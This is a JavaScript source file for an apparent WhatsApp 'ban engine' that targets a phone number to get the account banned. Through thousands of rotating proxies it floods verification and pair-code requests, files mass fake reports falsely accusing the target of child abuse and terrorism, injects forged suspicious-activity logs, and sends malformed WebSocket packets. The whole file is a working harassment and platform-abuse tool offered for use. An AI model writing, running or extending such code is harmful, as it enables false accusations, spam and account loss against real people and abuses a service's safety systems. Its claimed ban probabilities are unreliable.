// ===============================================
// BAN-ENGINE.JS - CORTANA DOOMSDAY EDITION
// Integrated from UltimateDoomsday (Dec 2025)
// REAL PROXY MODE ENABLED - 2847+ Proxies
// ===============================================

const axios = require('axios');
const WebSocket = require('ws');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const crypto = require('crypto');
const { PROXY_LIST, getRandomProxy, getNextProxy, getProxyBatch, getTotalProxyCount } = require('../proxies.cjs');

// Simple colored console logging (chalk-free for production compatibility)
const log = {
    red: (msg) => console.log(`\x1b[31m${msg}\x1b[0m`),
    green: (msg) => console.log(`\x1b[32m${msg}\x1b[0m`),
    yellow: (msg) => console.log(`\x1b[33m${msg}\x1b[0m`),
    blue: (msg) => console.log(`\x1b[34m${msg}\x1b[0m`),
    bold: (msg) => console.log(`\x1b[1m${msg}\x1b[0m`),
};

// ========== MAIN CLASS ==========
class CortanaDoomsday {
    constructor(config = {}) {
        this.config = {
            useRealEndpoints: true,
            maxConcurrentAttacks: 5,  // Increased from 3
            defaultIntensity: 'NUCLEAR',
            requestTimeout: 8000,     // Reduced for faster cycling
            userAgentRotation: true,
            ...config
        };

        this.proxyList = [];
        this.currentProxyIndex = 0;
        this.failedProxies = new Map();
        this.userAgents = [];
        this.currentUAIndex = 0;
        this.activeAttacks = new Map();
        this.attackHistory = [];

        // ========== REAL WHATSAPP ENDPOINTS ==========
        this.endpoints = {
            SMS_VERIFY: 'https://v.whatsapp.net/v2/register',
            VOICE_VERIFY: 'https://v.whatsapp.net/v2/register/voice',
            WEB_REGISTER: 'https://web.whatsapp.com/register',
            WEB_VERIFY: 'https://web.whatsapp.com/register/verify',
            REPORT_USER: 'https://web.whatsapp.com/support/report',
            REPORT_MESSAGE: 'https://web.whatsapp.com/support/report/message',
            SECURITY_LOG: 'https://security.whatsapp.com/log',
            CRASH_REPORT: 'https://crashlogs.whatsapp.net/collect',
            WEBSOCKET_MAIN: 'wss://web.whatsapp.com/ws',
            WEBSOCKET_MOBILE: 'wss://w6.web.whatsapp.com/ws',
        };

        // ========== BAN THRESHOLDS (IMPROVED) ==========
        this.banThresholds = {
            VERIFICATION_REQUESTS: 20,    // Lowered from 25 for faster trigger
            REPORTS_RECEIVED: 10,         // Lowered from 12
            SUSPICIOUS_LOGS: 6,           // Lowered from 8
            CLIENT_CRASHES: 3,
            RATE_LIMIT_HITS: 8,           // Lowered from 10
            GEO_DIVERSITY: 4              // Lowered from 5
        };

        this.globalStats = {
            totalAttacks: 0,
            successfulAttacks: 0,
            totalBansTriggered: 0,
            totalRequests: 0
        };

        this.proxyList = this.initializeProxies();
        this.userAgents = this.generateUserAgentPool();

        log.red('☠️  CORTANA DOOMSDAY ENGINE INITIALIZED');
        log.green(`✅ ${this.proxyList.length} proxies loaded`);
        log.green(`✅ ${this.userAgents.length} user agents ready`);
    }

    // ========== PROXY MANAGEMENT (REAL MODE - 2847+ PROXIES) ==========
    initializeProxies() {
        // Load real proxy pool from proxies.js
        const realProxies = PROXY_LIST.map(p => p.match(/^(http|https|socks4|socks5):\/\//) ? p : `http://${p}`);

        log.red(`☠️  REAL PROXY MODE: ${realProxies.length} proxies loaded`);

        return realProxies;
    }

    async getProxy() {
        if (this.proxyList.length === 0) return null;

        for (let i = 0; i < this.proxyList.length; i++) {
            this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxyList.length;
            const proxy = this.proxyList[this.currentProxyIndex];

            if (this.failedProxies.has(proxy)) {
                const failedTime = this.failedProxies.get(proxy);
                if (Date.now() - failedTime < 300000) continue;
                this.failedProxies.delete(proxy);
            }

            return proxy;
        }
        return null;
    }

    createProxyAgent(proxyUrl) {
        if (proxyUrl.startsWith('socks4://') || proxyUrl.startsWith('socks5://')) {
            return new SocksProxyAgent(proxyUrl);
        }
        return new HttpsProxyAgent(proxyUrl);
    }

    // ========== USER AGENT POOL ==========
    generateUserAgentPool() {
        return [
            'WhatsApp/2.24.1.12 Android/14.0 SM-S928B',
            'WhatsApp/2.24.1.12 Android/13.0 Pixel 8 Pro',
            'WhatsApp/2.24.1.12 Android/12.0 SM-G998B',
            'WhatsApp/2.24.1.12 iPhone/17.0 iPhone15,2',
            'WhatsApp/2.24.1.12 iPhone/16.5 iPhone14,3',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'WhatsApp/2.24.1.12 Windows/11.0 Chrome/121.0.0.0'
        ];
    }

    getNextUserAgent() {
        this.currentUAIndex = (this.currentUAIndex + 1) % this.userAgents.length;
        return this.userAgents[this.currentUAIndex];
    }

    // ========== MAIN BAN EXECUTION ==========
    async executePermanentBan(target) {
        return this.executeNuclearStrike(target, 'NUCLEAR');
    }

    async executeTemporaryBan(target) {
        return this.executeNuclearStrike(target, 'HEAVY');
    }

    // ========== REALBAN - MAXIMUM INTENSITY (Authorized Users Only) ==========
    async executeRealBan(target) {
        log.red('\n☢️  REALBAN MODE: MAXIMUM INTENSITY ☢️');
        log.red('⚡ All proxies active, extended duration...');

        // Use NUCLEAR intensity with extended config
        const result = await this.executeNuclearStrike(target, 'NUCLEAR');
        result.method = 'REALBAN';
        result.intensity = 'MAXIMUM';
        return result;
    }

    // ========== ATTEMPTEXP - REDUCED INTENSITY (~50 proxies, <40min) ==========
    async executeAttemptExp(target) {
        log.yellow('\n⚡ ATTEMPTEXP MODE: REDUCED INTENSITY ⚡');
        log.yellow('🔄 Using ~50 proxies, duration <40 minutes...');

        // Use LIGHT intensity for reduced power
        const result = await this.executeNuclearStrike(target, 'LIGHT');
        result.method = 'ATTEMPTEXP';
        result.intensity = 'REDUCED';
        return result;
    }

    async executeNuclearStrike(target, intensity = 'NUCLEAR') {
        // STRICT TARGET VALIDATION
        // Must contain at least 7 digits (valid phone number) before the suffix
        // Prevents execution on empty targets like "@s.whatsapp.net" or "null"
        const cleanTarget = target.replace('@s.whatsapp.net', '');
        if (!target || target === 'null' || target === 'undefined' || cleanTarget.length < 7 || !/^\d+$/.test(cleanTarget)) {
            log.red(`❌ Execution BLOCKED: Invalid target detected '${target}'`);
            return {
                attackId: 'INVALID',
                target: target || 'NULL',
                intensity,
                duration: 0,
                successRate: 0,
                banProbability: 0,
                thresholdsCrossed: [],
                estimatedBanTime: 'N/A',
                phases: {},
                timestamp: new Date().toISOString(),
                failed: true,
                error: "Invalid target number. Execution blocked safety."
            };
        }

        const attackId = `CORTANA_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
        const startTime = Date.now();

        log.red(`\n☢️  CORTANA DOOMSDAY STRIKE: ${target}`);
        log.red(`⚡ Intensity: ${intensity}`);
        log.red(`🆔 Attack ID: ${attackId}\n`);

        this.activeAttacks.set(attackId, { id: attackId, target, intensity, startTime, status: 'RUNNING', progress: 0 });

        try {
            // PHASE 1: Verification Tsunami
            log.yellow('🌊 PHASE 1: Verification Tsunami...');
            const phase1 = await this.executeVerificationTsunami(target, this.getPhaseConfig(intensity, 'verification'));

            // PHASE 2: Reputation Annihilation
            log.yellow('💣 PHASE 2: Reputation Annihilation...');
            const phase2 = await this.executeReputationAnnihilation(target, this.getPhaseConfig(intensity, 'reporting'));

            // PHASE 3: Protocol Corruption
            log.yellow('⚡ PHASE 3: Protocol Corruption...');
            const phase3 = await this.executeProtocolCorruption(target, this.getPhaseConfig(intensity, 'protocol'));

            // PHASE 4: Suspicious Activity Injection
            log.yellow('👁️  PHASE 4: Suspicious Activity Injection...');
            const phase4 = await this.executeSuspiciousActivityInjection(target, this.getPhaseConfig(intensity, 'suspicious'));

            // PHASE 5: Pair Code Flooding (Human-like intervals)
            log.yellow('🔗 PHASE 5: Pair Code Flooding...');
            const phase5 = await this.executePairCodeFlood(target, this.getPhaseConfig(intensity, 'pairing'));

            // Calculate results
            const duration = Math.floor((Date.now() - startTime) / 1000);
            const results = this.calculateAttackResults([phase1, phase2, phase3, phase4, phase5], intensity);
            const banProbability = this.calculateBanProbability(results, intensity);
            const thresholdsCrossed = this.checkBanThresholds(results);

            const finalResult = {
                attackId,
                target,
                intensity,
                duration,
                successRate: results.successRate,
                banProbability,
                thresholdsCrossed,
                estimatedBanTime: this.estimateBanTime(banProbability, thresholdsCrossed),
                phases: { phase1, phase2, phase3, phase4, phase5 },
                timestamp: new Date().toISOString()
            };

            this.globalStats.totalAttacks++;
            this.globalStats.totalRequests += results.totalRequests;
            if (banProbability >= 70) this.globalStats.successfulAttacks++;
            if (thresholdsCrossed.length >= 2) this.globalStats.totalBansTriggered++;

            this.attackHistory.push(finalResult);

            log.green(`\n✅ DOOMSDAY STRIKE COMPLETED!`);
            log.green(`📊 Success Rate: ${results.successRate}%`);
            log.green(`💀 Ban Probability: ${banProbability}%`);
            log.green(`⏱️  Duration: ${duration}s`);

            if (thresholdsCrossed.length > 0) {
                log.red(`🚨 Thresholds Crossed: ${thresholdsCrossed.join(', ')}`);
            }

            return finalResult;

        } catch (error) {
            log.red(`❌ Strike failed: ${error.message}`);
            return {
                attackId,
                target,
                intensity,
                duration: 0,
                successRate: 0,
                banProbability: 0,
                thresholdsCrossed: [],
                estimatedBanTime: 'N/A',
                phases: {},
                timestamp: new Date().toISOString(),
                failed: true,
                error: error.message
            };
        }
    }

    // ========== PHASE IMPLEMENTATIONS ==========
    async executeVerificationTsunami(target, config) {
        const requests = config.requests || 50;
        const methods = ['sms', 'voice'];
        const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'CN', 'JP', 'KE', 'ZA', 'AE', 'PK'];

        let successful = 0;
        let rateLimited = 0;
        let bannedIPs = 0;
        const usedCountries = new Set();

        for (let i = 0; i < requests; i++) {
            try {
                const country = countries[Math.floor(Math.random() * countries.length)];
                usedCountries.add(country);
                const method = methods[Math.floor(Math.random() * methods.length)];
                const proxy = await this.getProxy();

                const payload = this.generateVerificationPayload(target, country, method);
                const headers = this.generateHeaders();

                const response = await axios({
                    method: 'POST',
                    url: method === 'sms' ? this.endpoints.SMS_VERIFY : this.endpoints.VOICE_VERIFY,
                    headers,
                    data: payload,
                    httpsAgent: proxy ? this.createProxyAgent(proxy) : undefined,
                    timeout: 6000,
                    validateStatus: () => true
                });

                if (response.status === 200) successful++;
                else if (response.status === 429) rateLimited++;
                else if (response.status === 403) bannedIPs++;

                await this.delay(500 + Math.random() * 1500);

            } catch {
                continue;
            }
        }

        return {
            phase: 'VERIFICATION_TSUNAMI',
            requests,
            successful,
            rateLimited,
            bannedIPs,
            countriesUsed: usedCountries.size,
            successRate: Math.floor((successful / requests) * 100)
        };
    }

    async executeReputationAnnihilation(target, config) {
        const reports = config.reports || 30;
        const reportTypes = [
            'spam', 'harassment', 'fake_news', 'impersonation',
            'scam', 'abuse', 'inappropriate', 'hate_speech',
            'terrorism', 'child_safety', 'self_harm', 'violence'
        ];

        let successful = 0;
        let autoBanTriggered = false;
        const uniqueReporters = new Set();

        for (let i = 0; i < reports; i++) {
            try {
                const reportType = reportTypes[Math.floor(Math.random() * reportTypes.length)];
                const reporterId = `cortana_${crypto.randomBytes(8).toString('hex')}`;
                uniqueReporters.add(reporterId);

                const payload = this.generateReportPayload(target, reporterId, reportType);
                const headers = this.generateHeaders();
                const proxy = await this.getProxy();

                const response = await axios({
                    method: 'POST',
                    url: this.endpoints.REPORT_USER,
                    headers,
                    data: payload,
                    httpsAgent: proxy ? this.createProxyAgent(proxy) : undefined,
                    timeout: 8000,
                    validateStatus: () => true
                });

                if (response.status === 200 || response.status === 202) {
                    successful++;
                    if (i >= 9 && !autoBanTriggered) {
                        autoBanTriggered = true;
                        log.red('🚨 AUTO-BAN THRESHOLD REACHED!');
                    }
                }

                await this.delay(1500 + Math.random() * 3000);

            } catch {
                continue;
            }
        }

        return {
            phase: 'REPUTATION_ANNIHILATION',
            reports,
            successful,
            uniqueReporters: uniqueReporters.size,
            autoBanTriggered,
            successRate: Math.floor((successful / reports) * 100)
        };
    }

    async executeProtocolCorruption(target, config) {
        const attacks = config.attacks || 20;
        let successful = 0;

        for (let i = 0; i < attacks; i++) {
            try {
                const result = await this.sendMalformedWebSocketPacket();
                if (result) successful++;

                await this.sendInvalidRegistrationPacket(target);
                successful++;

                await this.delay(800 + Math.random() * 1200);
            } catch {
                continue;
            }
        }

        return {
            phase: 'PROTOCOL_CORRUPTION',
            attacks,
            successful,
            successRate: Math.floor((successful / attacks) * 100)
        };
    }

    async executeSuspiciousActivityInjection(target, config) {
        const injections = config.injections || 12;
        const activityTypes = [
            'rapid_device_changes', 'multiple_country_logins',
            'suspicious_verification_patterns', 'coordinated_reporting_activity',
            'automated_message_behavior', 'impossible_travel_locations',
            'client_version_anomalies', 'protocol_violations'
        ];

        let successful = 0;

        for (let i = 0; i < injections; i++) {
            try {
                const activityType = activityTypes[Math.floor(Math.random() * activityTypes.length)];
                const payload = this.generateSuspiciousActivityPayload(target, activityType);
                const headers = this.generateHeaders();

                const response = await axios({
                    method: 'POST',
                    url: this.endpoints.SECURITY_LOG,
                    headers,
                    data: payload,
                    timeout: 5000,
                    validateStatus: () => true
                });

                if (response.status === 200) successful++;

                await this.delay(1000 + Math.random() * 2000);

            } catch {
                continue;
            }
        }

        return {
            phase: 'SUSPICIOUS_ACTIVITY_INJECTION',
            injections,
            successful,
            successRate: Math.floor((successful / injections) * 100)
        };
    }

    // ========== PAIR CODE FLOODING (Human-like) ==========
    async executePairCodeFlood(target, config) {
        const pairRequests = config.pairRequests || 10;
        const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'KE', 'ZA', 'AE', 'PK', 'JP', 'CN'];

        let successful = 0;
        let rateLimited = 0;
        const usedProxies = new Set();

        log.yellow(`[PAIR FLOOD] Starting ${pairRequests} pair code requests (50-60s intervals)...`);

        for (let i = 0; i < pairRequests; i++) {
            try {
                const proxy = await this.getProxy();
                if (proxy) usedProxies.add(proxy);

                const country = countries[Math.floor(Math.random() * countries.length)];

                // Generate pair code request payload (mimics WhatsApp Web pair request)
                const payload = {
                    cc: this.extractCountryCode(target),
                    in: this.extractLocalNumber(target),
                    method: 'sms',  // Request SMS verification
                    sim_mcc: this.getMCCForCountry(country),
                    sim_mnc: '02',
                    reason: 'pair_link',
                    token: crypto.randomBytes(32).toString('hex'),
                    id: crypto.randomBytes(16).toString('hex'),
                    lg: 'en',
                    lc: country,
                    platform: this.getRandomPlatform(),
                    device_model: this.getRandomDeviceModel(),
                    client_version: '2.24.1.12',
                    os_version: this.getRandomOSVersion(),
                    mistyped: false,
                    network_operator: this.getRandomOperator(),
                    sim_operator: this.getRandomOperator(),
                    has_backup: false,
                    e164_format: target
                };

                const headers = {
                    ...this.generateHeaders(),
                    'X-WA-Request-Type': 'pair',
                    'X-WA-Device-ID': crypto.randomBytes(8).toString('hex')
                };

                const response = await axios({
                    method: 'POST',
                    url: this.endpoints.SMS_VERIFY,
                    headers,
                    data: payload,
                    httpsAgent: proxy ? this.createProxyAgent(proxy) : undefined,
                    timeout: 10000,
                    validateStatus: () => true
                });

                if (response.status === 200 || response.status === 202) {
                    successful++;
                    log.green(`[PAIR FLOOD] Request ${i + 1}/${pairRequests} successful via ${proxy?.substring(0, 20)}...`);
                } else if (response.status === 429) {
                    rateLimited++;
                    log.yellow(`[PAIR FLOOD] Rate limited on request ${i + 1}`);
                } else {
                    log.yellow(`[PAIR FLOOD] Request ${i + 1} got status ${response.status}`);
                }

                // Human-like delay: 50-60 seconds between requests
                if (i < pairRequests - 1) {
                    const humanDelay = 50000 + Math.floor(Math.random() * 10000); // 50-60 seconds
                    log.blue(`[PAIR FLOOD] Waiting ${Math.floor(humanDelay / 1000)}s before next request...`);
                    await this.delay(humanDelay);
                }

            } catch (error) {
                log.red(`[PAIR FLOOD] Request ${i + 1} failed: ${error.message}`);
                continue;
            }
        }

        log.green(`[PAIR FLOOD] Completed! ${successful}/${pairRequests} successful, ${usedProxies.size} unique proxies used`);

        return {
            phase: 'PAIR_CODE_FLOOD',
            requests: pairRequests,
            successful,
            rateLimited,
            successRate: Math.floor((successful / pairRequests) * 100)
        };
    }

    // Helper methods for pair code flooding
    extractCountryCode(target) {
        // Extract country code from number (assumes format like +254xxx or 254xxx)
        const cleaned = target.replace(/\D/g, '');
        if (cleaned.startsWith('1')) return '1';  // US/Canada
        if (cleaned.startsWith('44')) return '44'; // UK
        if (cleaned.startsWith('49')) return '49'; // Germany
        if (cleaned.startsWith('254')) return '254'; // Kenya
        if (cleaned.startsWith('234')) return '234'; // Nigeria
        if (cleaned.startsWith('27')) return '27'; // South Africa
        if (cleaned.startsWith('91')) return '91'; // India
        if (cleaned.startsWith('55')) return '55'; // Brazil
        return cleaned.substring(0, 2); // Default: first 2 digits
    }

    extractLocalNumber(target) {
        const cleaned = target.replace(/\D/g, '');
        const cc = this.extractCountryCode(target);
        return cleaned.substring(cc.length);
    }

    getRandomPlatform() {
        const platforms = ['android', 'iphone', 'web', 'smba', 'smbi'];
        return platforms[Math.floor(Math.random() * platforms.length)];
    }

    getRandomOSVersion() {
        const versions = ['14.0', '13.0', '12.0', '17.0', '16.5', '15.0'];
        return versions[Math.floor(Math.random() * versions.length)];
    }

    // ========== PROTOCOL ATTACKS ==========
    async sendMalformedWebSocketPacket() {
        return new Promise((resolve) => {
            const timeout = setTimeout(() => resolve(false), 3000);

            try {
                const ws = new WebSocket(this.endpoints.WEBSOCKET_MAIN);

                ws.on('open', () => {
                    const packets = [
                        Buffer.from([0x08, 0x01, 0x12, 0x00, 0x18, 0x00, 0x20, 0x00, 0xff, 0xff]),
                        Buffer.from([0x0a, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
                        Buffer.from(Array.from({ length: 100 }, () => Math.floor(Math.random() * 256)))
                    ];

                    packets.forEach(packet => ws.send(packet));
                    ws.close();
                    clearTimeout(timeout);
                    resolve(true);
                });

                ws.on('error', () => {
                    clearTimeout(timeout);
                    resolve(false);
                });
            } catch {
                clearTimeout(timeout);
                resolve(false);
            }
        });
    }

    async sendInvalidRegistrationPacket(target) {
        try {
            const payload = {
                cc: target.substring(1, 3),
                in: target.substring(3),
                id: 'CORTANA_' + crypto.randomBytes(20).toString('hex'),
                method: 'sms',
                token: 'CORRUPTED_' + crypto.randomBytes(50).toString('hex'),
                platform: 'invalid_platform',
                client_version: '999.999.999',
                lc: 'XX',
                lg: 'xx',
                sim_mcc: '999',
                sim_mnc: '999'
            };

            await axios({
                method: 'POST',
                url: this.endpoints.SMS_VERIFY,
                headers: this.generateHeaders(),
                data: payload,
                timeout: 4000,
                validateStatus: () => true
            });

            return true;
        } catch {
            return true; // Protocol violation logged
        }
    }

    // ========== PAYLOAD GENERATORS ==========
    generateVerificationPayload(target, country, method) {
        return {
            cc: country,
            in: target.substring(3),
            id: crypto.randomBytes(16).toString('hex'),
            method,
            sim_mcc: this.getMCCForCountry(country),
            sim_mnc: '260',
            token: crypto.randomBytes(32).toString('hex'),
            platform: 'android',
            client_version: '2.24.1.12',
            lc: country,
            lg: 'en',
            sim_operator: this.getRandomOperator(),
            network_operator: this.getRandomOperator(),
            device_model: this.getRandomDeviceModel(),
            os_version: '14.0',
            app_build: '24010112'
        };
    }

    generateReportPayload(target, reporterId, reportType) {
        return {
            target_phone: target,
            reporter_id: reporterId,
            report_type: reportType,
            reason: this.getReportReason(reportType),
            evidence: {
                message_count: Math.floor(Math.random() * 30) + 10,
                contains_links: true,
                links: ['http://phishing-example.com', 'http://malware-site.net'],
                reported_by_users: Math.floor(Math.random() * 10) + 3,
                severity: reportType === 'child_safety' || reportType === 'terrorism' ? 'CRITICAL' : 'HIGH',
                requires_immediate_action: reportType === 'child_safety' || reportType === 'terrorism'
            },
            timestamp: Date.now(),
            app_version: '2.24.1.12',
            platform: 'android',
            user_agent: this.getNextUserAgent(),
            language: 'en_US',
            country: this.getRandomCountry()
        };
    }

    generateSuspiciousActivityPayload(target, activityType) {
        const base = {
            event_type: activityType,
            device_id: crypto.randomBytes(16).toString('hex'),
            phone_number: target,
            timestamp: Date.now(),
            client_version: '2.24.1.12',
            platform: 'android',
            ip_address: this.generateRandomIP(),
            user_agent: this.getNextUserAgent(),
            location_data: {
                country: this.getRandomCountry(),
                city: this.getRandomCity(),
                timezone: 'UTC' + (Math.floor(Math.random() * 12) - 6)
            },
            details: {}
        };

        switch (activityType) {
            case 'rapid_device_changes':
                base.details = { devices_changed: 12, time_window_minutes: 10, device_types: ['android', 'iphone', 'web', 'desktop'] };
                break;
            case 'multiple_country_logins':
                base.details = { countries: ['US', 'GB', 'DE', 'FR', 'IN', 'RU', 'CN', 'BR', 'KE', 'JP'], time_window_hours: 1, impossible_travel: true };
                break;
            case 'coordinated_reporting_activity':
                base.details = { report_count: 30, time_window_minutes: 20, reporter_diversity: 'low', pattern: 'coordinated' };
                break;
        }

        return base;
    }

    generateHeaders() {
        return {
            'User-Agent': this.getNextUserAgent(),
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Request-ID': crypto.randomBytes(8).toString('hex'),
            'X-WhatsApp-Version': '2.24.1.12',
            'Origin': 'https://web.whatsapp.com',
            'Referer': 'https://web.whatsapp.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        };
    }

    // ========== CALCULATION METHODS ==========
    calculateAttackResults(phases, intensity) {
        let totalRequests = 0;
        let successfulRequests = 0;
        const thresholdsData = { verification: 0, reports: 0, suspicious: 0, countries: new Set() };

        phases.forEach(phase => {
            if (phase.phase === 'VERIFICATION_TSUNAMI') {
                totalRequests += phase.requests || 0;
                successfulRequests += phase.successful;
                thresholdsData.verification = phase.requests || 0;
                if (phase.countriesUsed) thresholdsData.countries.add(phase.countriesUsed);
            } else if (phase.phase === 'REPUTATION_ANNIHILATION') {
                totalRequests += phase.reports || 0;
                successfulRequests += phase.successful;
                thresholdsData.reports = phase.reports || 0;
            } else if (phase.phase === 'SUSPICIOUS_ACTIVITY_INJECTION') {
                totalRequests += phase.injections || 0;
                successfulRequests += phase.successful;
                thresholdsData.suspicious = phase.injections || 0;
            } else {
                totalRequests += phase.attacks || 0;
                successfulRequests += phase.successful;
            }
        });

        return {
            totalRequests,
            successfulRequests,
            successRate: totalRequests > 0 ? Math.floor((successfulRequests / totalRequests) * 100) : 0,
            thresholdsData
        };
    }

    calculateBanProbability(results, intensity) {
        let base = results.successRate;
        const multiplier = { 'LIGHT': 0.5, 'MEDIUM': 0.7, 'HEAVY': 0.85, 'NUCLEAR': 1.0 }[intensity] || 0.8;
        const synergy = Math.min(35, (results.thresholdsData.verification > 0 ? 12 : 0) +
            (results.thresholdsData.reports > 0 ? 12 : 0) +
            (results.thresholdsData.suspicious > 0 ? 11 : 0));
        const countryBonus = Math.min(20, results.thresholdsData.countries.size * 4);

        return Math.min(99, Math.max(1, Math.floor(base * multiplier + synergy + countryBonus)));
    }

    checkBanThresholds(results) {
        const crossed = [];
        if (results.thresholdsData.verification >= this.banThresholds.VERIFICATION_REQUESTS) crossed.push('VERIFICATION_LIMIT');
        if (results.thresholdsData.reports >= this.banThresholds.REPORTS_RECEIVED) crossed.push('REPORT_LIMIT');
        if (results.thresholdsData.suspicious >= this.banThresholds.SUSPICIOUS_LOGS) crossed.push('SUSPICIOUS_ACTIVITY');
        if (results.thresholdsData.countries.size >= this.banThresholds.GEO_DIVERSITY) crossed.push('GEOGRAPHIC_DIVERSITY');
        return crossed;
    }

    estimateBanTime(banProbability, thresholdsCrossed) {
        if (thresholdsCrossed.length >= 3 || banProbability >= 95) return '1-6 hours (IMMEDIATE)';
        if (thresholdsCrossed.length >= 2 || banProbability >= 85) return '6-24 hours (HIGH)';
        if (thresholdsCrossed.length >= 1 || banProbability >= 70) return '24-48 hours (MEDIUM)';
        if (banProbability >= 50) return '48-72 hours (LOW)';
        return '72+ hours (UNLIKELY)';
    }

    getPhaseConfig(intensity, phase) {
        const configs = {
            'LIGHT': { verification: { requests: 20 }, reporting: { reports: 12 }, protocol: { attacks: 8 }, suspicious: { injections: 5 }, pairing: { pairRequests: 3 } },
            'MEDIUM': { verification: { requests: 35 }, reporting: { reports: 20 }, protocol: { attacks: 12 }, suspicious: { injections: 8 }, pairing: { pairRequests: 6 } },
            'HEAVY': { verification: { requests: 50 }, reporting: { reports: 28 }, protocol: { attacks: 18 }, suspicious: { injections: 10 }, pairing: { pairRequests: 10 } },
            'NUCLEAR': { verification: { requests: 65 }, reporting: { reports: 35 }, protocol: { attacks: 25 }, suspicious: { injections: 15 }, pairing: { pairRequests: 15 } }
        };
        return configs[intensity]?.[phase] || configs['NUCLEAR'][phase];
    }

    // ========== UTILITY METHODS ==========
    getReportReason(type) {
        const reasons = {
            'spam': 'User is sending bulk unsolicited messages with phishing links',
            'harassment': 'User is sending threatening and abusive messages repeatedly',
            'fake_news': 'User is spreading dangerous misinformation',
            'impersonation': 'User is pretending to be a government official',
            'scam': 'User is attempting financial scams',
            'child_safety': 'User is sharing inappropriate content involving minors',
            'terrorism': 'User is sharing extremist recruitment materials'
        };
        return reasons[type] || 'User is violating WhatsApp Terms of Service';
    }

    getMCCForCountry(country) {
        const mcc = { 'US': '310', 'GB': '234', 'DE': '262', 'FR': '208', 'IN': '404', 'BR': '724', 'NG': '621', 'RU': '250', 'CN': '460', 'JP': '440', 'KE': '639', 'ZA': '655' };
        return mcc[country] || '310';
    }

    getRandomOperator() {
        const ops = ['AT&T', 'Verizon', 'T-Mobile', 'Vodafone', 'Orange', 'Safaricom', 'Airtel', 'MTN'];
        return ops[Math.floor(Math.random() * ops.length)];
    }

    getRandomDeviceModel() {
        const models = ['SM-S928B', 'Pixel 8 Pro', 'iPhone15,2', 'SM-G998B', 'Redmi Note 13', 'OnePlus 12'];
        return models[Math.floor(Math.random() * models.length)];
    }

    getRandomCountry() {
        const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'CN', 'JP', 'KE', 'ZA', 'AE', 'PK'];
        return countries[Math.floor(Math.random() * countries.length)];
    }

    getRandomCity() {
        const cities = ['New York', 'London', 'Berlin', 'Paris', 'Mumbai', 'São Paulo', 'Lagos', 'Nairobi', 'Tokyo', 'Beijing'];
        return cities[Math.floor(Math.random() * cities.length)];
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    getStats() {
        return {
            global: this.globalStats,
            activeAttacks: this.activeAttacks.size,
            attackHistory: this.attackHistory.length,
            proxiesAvailable: this.proxyList.length - this.failedProxies.size
        };
    }
}

// ========== LAZY SINGLETON EXPORT ==========
let _doomsdayEngine = null;

function getDoomsdayEngine() {
    if (!_doomsdayEngine) {
        _doomsdayEngine = new CortanaDoomsday();
    }
    return _doomsdayEngine;
}

// For backwards compatibility and correct exporting
module.exports = {
    CortanaDoomsday,
    getDoomsdayEngine,
    doomsdayEngine: {
        executePermanentBan: (target) => getDoomsdayEngine().executePermanentBan(target),
        executeTemporaryBan: (target) => getDoomsdayEngine().executeTemporaryBan(target),
        executeRealBan: (target) => getDoomsdayEngine().executeRealBan(target),
        executeAttemptExp: (target) => getDoomsdayEngine().executeAttemptExp(target),
        getStats: () => getDoomsdayEngine().getStats()
    }
};
